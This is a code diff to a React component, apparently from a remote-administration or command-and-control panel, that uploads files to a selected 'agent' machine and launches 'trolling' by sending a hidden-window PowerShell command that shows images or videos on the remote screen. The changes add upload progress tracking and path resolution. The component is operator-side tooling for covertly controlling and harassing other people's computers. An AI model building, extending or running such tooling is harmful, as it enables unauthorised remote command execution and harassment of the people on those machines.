@@ -4,34 +4,31 @@ import { Input } from './ui/input';
 import { Label } from './ui/label';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/card';
 import { Alert, AlertDescription } from './ui/alert';
+import { Progress } from './ui/progress';
 import { Upload, File, Image, Video, Folder, AlertCircle, Play, Trash2 } from 'lucide-react';
 import { useSocket } from './SocketProvider';
 
-interface UploadedFile {
+interface PendingFile {
   id: string;
-  name: string;
-  size: number;
-  type: string;
-  content: string; // base64
-  path?: string;
-}
-
-interface TrollingScript {
-  type: 'image' | 'video';
-  filename: string;
-  path: string;
-  script: string;
+  file: File;
 }
 
 export function BulkUploadManager() {
-  const { socket, selectedAgent } = useSocket();
-  const [files, setFiles] = useState<UploadedFile[]>([]);
+  const { socket, connected, selectedAgent, uploadFile, sendCommand } = useSocket();
+  const [files, setFiles] = useState<PendingFile[]>([]);
   const [folderPath, setFolderPath] = useState('');
   const [isDragging, setIsDragging] = useState(false);
   const [error, setError] = useState('');
   const [success, setSuccess] = useState('');
   const [isUploading, setIsUploading] = useState(false);
+  const [uploadingById, setUploadingById] = useState<Record<string, boolean>>({});
+  const [progressById, setProgressById] = useState<Record<string, number>>({});
   const fileInputRef = useRef<HTMLInputElement>(null);
+
+  const formatError = (err: unknown) => {
+    if (err instanceof Error) return err.message;
+    return String(err);
+  };
 
   const generateImageTrollingScript = (imagePath: string): string => {
     return `Add-Type -AssemblyName PresentationFramework
@@ -92,37 +89,51 @@ $w.ShowDialog()`;
     }
   };
 
+  const makeId = () => {
+    try {
+      return crypto.randomUUID();
+    } catch {
+      return Math.random().toString(36).slice(2);
+    }
+  };
+
+  const resolveDestinationPath = (basePath: string, filename: string) => {
+    const raw = (basePath || '').trim();
+    if (!raw) return filename;
+    const lower = raw.toLowerCase();
+    const filenameLower = filename.toLowerCase();
+    if (lower.endsWith(`/${filenameLower}`) || lower.endsWith(`\\${filenameLower}`)) {
+      return raw;
+    }
+    if (raw.endsWith('/') || raw.endsWith('\\')) {
+      return `${raw}${filename}`;
+    }
+    if (/^[a-zA-Z]:$/.test(raw)) {
+      return `${raw}\\${filename}`;
+    }
+    const separator = raw.includes('\\') || /^[a-zA-Z]:/.test(raw) ? '\\' : '/';
+    return `${raw}${separator}${filename}`;
+  };
+
   const processFiles = async (fileList: File[]) => {
     setError('');
     setSuccess('');
     
-    const processedFiles: UploadedFile[] = [];
+    const processedFiles: PendingFile[] = [];
     
     for (const file of fileList) {
-      if (file.size > 50 * 1024 * 1024) { // 50MB limit
+      if (file.size > 50 * 1024 * 1024) {
         setError(`File ${file.name} is too large (max 50MB)`);
         continue;
       }
 
-      const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'video/mp4', 'video/webm', 'video/avi'];
+      const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'video/mp4', 'video/webm', 'video/avi', 'video/x-msvideo'];
       if (!allowedTypes.includes(file.type)) {
         setError(`File ${file.name} type not supported. Use: JPG, PNG, GIF, WebP, MP4, WebM, AVI`);
         continue;
       }
 
-      try {
-        const base64 = await fileToBase64(file);
-        processedFiles.push({
-          id: Math.random().toString(36).substr(2, 9),
-          name: file.name,
-          size: file.size,
-          type: file.type,
-          content: base64,
-          path: folderPath || `C:\\Users\\${file.name}`
-        });
-      } catch (err) {
-        setError(`Failed to process ${file.name}: ${err}`);
-      }
+      processedFiles.push({ id: makeId(), file });
     }
 
     setFiles(prev => [...prev, ...processedFiles]);
@@ -131,80 +142,102 @@ $w.ShowDialog()`;
     }
   };
 
-  const fileToBase64 = (file: File): Promise<string> => {
-    return new Promise((resolve, reject) => {
-      const reader = new FileReader();
-      reader.onload = () => {
-        const base64 = (reader.result as string).split(',')[1];
-        resolve(base64);
+  const uploadAndWait = async (pending: PendingFile, destinationPath: string) => {
+    if (!socket || !connected) {
+      throw new Error('Not connected');
+    }
+    if (!selectedAgent) {
+      throw new Error('No agent selected');
+    }
+
+    const expectedDestinationPath = resolveDestinationPath(destinationPath, pending.file.name);
+
+    setUploadingById(prev => ({ ...prev, [pending.id]: true }));
+    setProgressById(prev => ({ ...prev, [pending.id]: 0 }));
+
+    await new Promise<void>((resolve, reject) => {
+      const maxMs = Math.min(20 * 60 * 1000, Math.max(90 * 1000, pending.file.size * 2));
+      const timeoutId = window.setTimeout(() => {
+        window.removeEventListener('file_upload_progress', onProgress);
+        window.removeEventListener('file_upload_complete', onComplete);
+        reject(new Error('Upload timed out'));
+      }, maxMs);
+
+      const cleanup = () => {
+        window.clearTimeout(timeoutId);
+        window.removeEventListener('file_upload_progress', onProgress);
+        window.removeEventListener('file_upload_complete', onComplete);
       };
-      reader.onerror = reject;
-      reader.readAsDataURL(file);
+
+      const onProgress = (event: any) => {
+        const data = event?.detail;
+        if (!data) return;
+        if (data.agent_id !== selectedAgent) return;
+        if (data.filename !== pending.file.name) return;
+        if (data.destination_path !== expectedDestinationPath) return;
+        if (typeof data.progress === 'number' && data.progress >= 0) {
+          setProgressById(prev => ({ ...prev, [pending.id]: data.progress }));
+        }
+      };
+
+      const onComplete = (event: any) => {
+        const data = event?.detail;
+        if (!data) return;
+        if (data.agent_id !== selectedAgent) return;
+        if (data.filename !== pending.file.name) return;
+        if (data.destination_path !== expectedDestinationPath) return;
+        cleanup();
+        setProgressById(prev => ({ ...prev, [pending.id]: 100 }));
+        resolve();
+      };
+
+      window.addEventListener('file_upload_progress', onProgress);
+      window.addEventListener('file_upload_complete', onComplete);
+      uploadFile(selectedAgent, pending.file, expectedDestinationPath);
     });
   };
 
-  const uploadFile = async (file: UploadedFile) => {
-    if (!socket || !selectedAgent) {
-      setError('No agent selected');
-      return;
-    }
-
-    setIsUploading(true);
+  const uploadSingle = async (pending: PendingFile) => {
     setError('');
-    
+    setSuccess('');
     try {
-      socket.emit('upload_file', {
-        agent_id: selectedAgent,
-        filename: file.name,
-        content: file.content,
-        destination_path: file.path || `C:\\Users\\${file.name}`
-      });
-      
-      setSuccess(`File ${file.name} uploaded successfully`);
-      
-      // Remove from list after successful upload
-      setFiles(prev => prev.filter(f => f.id !== file.id));
-      
+      await uploadAndWait(pending, folderPath);
+      setFiles(prev => prev.filter(f => f.id !== pending.id));
+      setSuccess(`File ${pending.file.name} uploaded successfully`);
     } catch (err) {
-      setError(`Upload failed: ${err}`);
+      setError(`Upload failed: ${formatError(err)}`);
     } finally {
-      setIsUploading(false);
+      setUploadingById(prev => ({ ...prev, [pending.id]: false }));
     }
   };
 
-  const startTrolling = async (file: UploadedFile) => {
-    if (!socket || !selectedAgent) {
+  const startTrolling = async (pending: PendingFile) => {
+    if (!selectedAgent) {
       setError('No agent selected');
       return;
     }
 
-    const filePath = file.path || `C:\\Users\\${file.name}`;
+    const filePath = resolveDestinationPath(folderPath, pending.file.name);
     let script: string;
 
-    if (file.type.startsWith('image/')) {
+    if (pending.file.type.startsWith('image/')) {
       script = generateImageTrollingScript(filePath);
-    } else if (file.type.startsWith('video/')) {
+    } else if (pending.file.type.startsWith('video/')) {
       script = generateVideoTrollingScript(filePath);
     } else {
       setError('Unsupported file type for trolling');
       return;
     }
 
-    // First upload the file
     try {
-      await uploadFile(file);
-      
-      // Then execute the trolling script
-      socket.emit('command', {
-        agent_id: selectedAgent,
-        command: `powershell -WindowStyle Hidden -Command "${script.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`,
-        execution_id: `trolling-${Date.now()}`
-      });
-      
-      setSuccess(`Trolling started with ${file.name}`);
-      
+      await uploadAndWait(pending, folderPath);
+      setFiles(prev => prev.filter(f => f.id !== pending.id));
+      sendCommand(selectedAgent, `powershell -WindowStyle Hidden -Command "${script.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`);
+      setSuccess(`Trolling started with ${pending.file.name}`);
     } catch (err) {
-      setError(`Trolling failed: ${err}`);
+      setError(`Trolling failed: ${formatError(err)}`);
+    } finally {
+      setUploadingById(prev => ({ ...prev, [pending.id]: false }));
     }
   };
 
@@ -220,13 +253,16 @@ $w.ShowDialog()`;
     let successCount = 0;
     let errorCount = 0;
 
-    for (const file of files) {
+    for (const pending of [...files]) {
       try {
-        await uploadFile(file);
+        await uploadAndWait(pending, folderPath);
+        setFiles(prev => prev.filter(f => f.id !== pending.id));
         successCount++;
       } catch (err) {
         errorCount++;
-        setError(`Failed to upload ${file.name}: ${err}`);
+        setError(`Failed to upload ${pending.file.name}: ${formatError(err)}`);
+      } finally {
+        setUploadingById(prev => ({ ...prev, [pending.id]: false }));
       }
     }
 
@@ -276,7 +312,7 @@ $w.ShowDialog()`;
           )}
 
           <div className="space-y-2">
-            <Label htmlFor="folder-path">Target Folder Directory</Label>
+            <Label htmlFor="folder-path">Target Folder or Full Path</Label>
             <div className="flex gap-2">
               <Input
                 id="folder-path"
@@ -339,20 +375,30 @@ $w.ShowDialog()`;
               </div>
               
               <div className="space-y-1 max-h-64 overflow-y-auto">
-                {files.map((file) => (
+                {files.map((pending) => (
                   <div
-                    key={file.id}
+                    key={pending.id}
                     className="flex items-center gap-2 p-2 border rounded-md"
                   >
-                    {getFileIcon(file.type)}
+                    {getFileIcon(pending.file.type)}
                     <div className="flex-1 min-w-0">
-                      <p className="text-sm font-medium truncate">{file.name}</p>
-                      <p className="text-xs text-muted-foreground">{formatFileSize(file.size)}</p>
+                      <div className="flex items-center gap-2">
+                        <p className="text-sm font-medium truncate">{pending.file.name}</p>
+                        {uploadingById[pending.id] && (
+                          <span className="text-xs text-muted-foreground tabular-nums">
+                            {Math.min(100, Math.max(0, progressById[pending.id] ?? 0))}%
+                          </span>
+                        )}
+                      </div>
+                      <p className="text-xs text-muted-foreground">{formatFileSize(pending.file.size)}</p>
+                      {uploadingById[pending.id] && (
+                        <Progress value={Math.min(100, Math.max(0, progressById[pending.id] ?? 0))} className="h-1 mt-1" />
+                      )}
                     </div>
                     <div className="flex gap-1">
                       <Button
-                        onClick={() => startTrolling(file)}
-                        disabled={isUploading}
+                        onClick={() => startTrolling(pending)}
+                        disabled={isUploading || uploadingById[pending.id]}
                         size="sm"
                         variant="outline"
                         title="Start trolling with this file"
@@ -360,8 +406,8 @@ $w.ShowDialog()`;
                         <Play className="h-3 w-3" />
                       </Button>
                       <Button
-                        onClick={() => uploadFile(file)}
-                        disabled={isUploading}
+                        onClick={() => uploadSingle(pending)}
+                        disabled={isUploading || uploadingById[pending.id]}
                         size="sm"
                         variant="outline"
                         title="Upload file"
@@ -369,7 +415,8 @@ $w.ShowDialog()`;
                         <Upload className="h-3 w-3" />
                       </Button>
                       <Button
-                        onClick={() => removeFile(file.id)}
+                        onClick={() => removeFile(pending.id)}
+                        disabled={uploadingById[pending.id]}
                         size="sm"
                         variant="outline"
                         title="Remove file"
